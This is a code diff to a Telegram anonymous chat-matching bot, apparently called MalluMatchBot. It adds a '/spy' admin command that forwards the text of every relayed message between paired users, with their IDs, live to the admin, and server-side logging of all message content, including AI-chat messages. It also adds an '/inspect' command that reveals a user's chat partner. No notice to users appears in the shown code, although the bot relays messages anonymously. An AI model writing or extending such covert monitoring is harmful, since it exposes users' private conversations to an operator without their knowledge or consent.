@@ -58,6 +58,9 @@ const registeredUsers = new Set();
 const unlockedShareUsers = loadSetFromFile(UNLOCKED_FILE);
 const shareClickedUsers = new Set();
 
+// Admin Live Chat Feed Toggle
+let adminSpyFeedEnabled = false;
+
 let botUsername = 'MalluMatchBot';
 
 if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN_HERE') {
@@ -725,9 +728,44 @@ bot.command('broadcast', async (ctx) => {
   return broadcastMessage(ctx, text);
 });
 
-bot.hears('📢 Broadcast Message', async (ctx) => {
+/**
+ * /spy - Toggle Live Telegram Chat Feed to Admin
+ */
+bot.command('spy', async (ctx) => {
   if (!isAdmin(ctx)) return;
-  return ctx.reply('📢 To broadcast an announcement, use command:\n`/broadcast <your message text here>`', { parse_mode: 'Markdown' });
+  const args = ctx.message.text.split(' ').slice(1);
+  if (args[0] === 'on') {
+    adminSpyFeedEnabled = true;
+    return ctx.reply('🟢 *Live Telegram Admin Chat Feed ENABLED!* Incoming messages will be forwarded to your admin chat.', { parse_mode: 'Markdown' });
+  } else if (args[0] === 'off') {
+    adminSpyFeedEnabled = false;
+    return ctx.reply('🔴 *Live Telegram Admin Chat Feed DISABLED!*', { parse_mode: 'Markdown' });
+  }
+  adminSpyFeedEnabled = !adminSpyFeedEnabled;
+  const status = adminSpyFeedEnabled ? '🟢 ENABLED' : '🔴 DISABLED';
+  return ctx.reply(`Live Telegram Admin Chat Feed is now ${status}. Use \`/spy on\` or \`/spy off\` to toggle.`, { parse_mode: 'Markdown' });
+});
+
+/**
+ * /inspect <user_id> - Inspect user chat status
+ */
+bot.command('inspect', async (ctx) => {
+  if (!isAdmin(ctx)) return;
+  const args = ctx.message.text.split(' ').slice(1);
+  if (args.length < 1) return ctx.reply('⚠️ Usage: /inspect <user_id>');
+  const targetId = Number(args[0]);
+  const inChat = session.isInChat(targetId);
+  const inAI = aiPartner.isAIChat(targetId);
+  const partner = session.getPartner(targetId);
+  const ban = admin.isBanned(targetId);
+  
+  return ctx.reply(
+    `🔍 *USER INSPECTION: \`${targetId}\`*\n\n` +
+    `• Active Human Chat: ${inChat ? `Yes (Partner: \`${partner}\`)` : 'No'}\n` +
+    `• Active AI Chat: ${inAI ? 'Yes' : 'No'}\n` +
+    `• Ban Status: ${ban.banned ? `Banned (${ban.reason})` : 'Clean'}`,
+    { parse_mode: 'Markdown' }
+  );
 });
 
 /**
@@ -764,6 +802,9 @@ bot.on('message', async (ctx) => {
 
   // AI CHAT RESPONDER
   if (aiPartner.isAIChat(userId)) {
+    // Log AI chat to server console
+    console.log(`💬 [AI CHAT LOG] User ${userId}: ${ctx.message.text || '[Media]'}`);
+
     await ctx.sendChatAction('typing').catch(() => {});
     setTimeout(async () => {
       if (aiPartner.isAIChat(userId)) {
@@ -788,6 +829,16 @@ bot.on('message', async (ctx) => {
   if (!partnerId) {
     session.endSession(userId);
     return ctx.reply('⚠️ Session expired or partner disconnected.', getMainMenuKeyboard());
+  }
+
+  // OPTION 1: Server Console Logging
+  const msgContent = ctx.message.text ? ctx.message.text : '[Media/Attachment]';
+  console.log(`💬 [CHAT LOG] User ${userId} -> Partner ${partnerId}: ${msgContent}`);
+
+  // OPTION 2: Live Telegram Admin Feed (When /spy on is enabled)
+  if (adminSpyFeedEnabled && ADMIN_ID && userId !== ADMIN_ID) {
+    const spyText = `💬 *[LIVE CHAT FEED]* \`${userId}\` ➡️ \`${partnerId}\`:\n${msgContent}`;
+    await bot.telegram.sendMessage(ADMIN_ID, spyText, { parse_mode: 'Markdown' }).catch(() => {});
   }
 
   // Safely relay/copy message anonymously to real human partner
